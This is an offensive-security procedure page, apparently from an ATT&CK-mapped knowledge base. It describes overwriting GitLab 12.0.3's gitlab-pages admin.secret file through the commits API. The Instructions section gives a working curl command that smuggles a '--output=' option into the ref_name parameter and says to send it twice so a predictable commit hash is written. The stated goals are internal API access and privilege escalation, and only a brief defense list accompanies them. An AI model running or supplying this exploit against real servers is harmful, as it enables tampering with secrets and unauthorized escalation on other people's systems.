---
id: proc-overwrite-secret
tags:
  - file-overwrite
  - secrets
  - gitlab
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Defense Evasion]]'
commands:
  - '[[commands/curl-gitlab-secret-overwrite]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Stored Data Manipulation]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:08.792Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Stored Data Manipulation]]'
  - '[[Exploit Public-Facing Application]]'
---
# Overwrite-GitLab-Secret-File-via-API

## Summary

This procedure uses repeated API injections to overwrite critical secret files like admin.secret with a known commit hash, bypassing truncation for predictable values.

## Description

By sending the request twice quickly, the first triggers write, the second avoids rev-list truncation, replacing secrets for later use. Targets /var/opt/gitlab/gitlab-pages/admin.secret in GitLab 12.0.3.

## Requirements

1. Vulnerable GitLab API access
2. Project with commits
3. Ability to send rapid requests (e.g., script or manual)

## Defense

Defensive measures and detection strategies:

- Protect secret files with immutable attributes
- Monitor API requests for repeated commits calls
- Use secret rotation and integrity checks

## Objectives

1. Replace secret with known value
2. Enable internal API access
3. Facilitate privilege escalation

## Instructions

### Step 1: Send Injection Twice

**Context**: Target the secret path; repetition ensures write without truncate.

**Command** ([[commands/curl-gitlab-secret-overwrite]]):
```bash
curl 'http://target/api/v4/projects/5/repository/commits?ref_name=--output=/var/opt/gitlab/gitlab-pages/admin.secret'
```

> Run twice; second execution writes hash to file.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion]]

### Techniques

- [[Stored Data Manipulation]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-gitlab-secret-overwrite]]

## Tools Used

- [[tools/curl]]

## Tags

- [[file-overwrite]]
- [[secrets]]
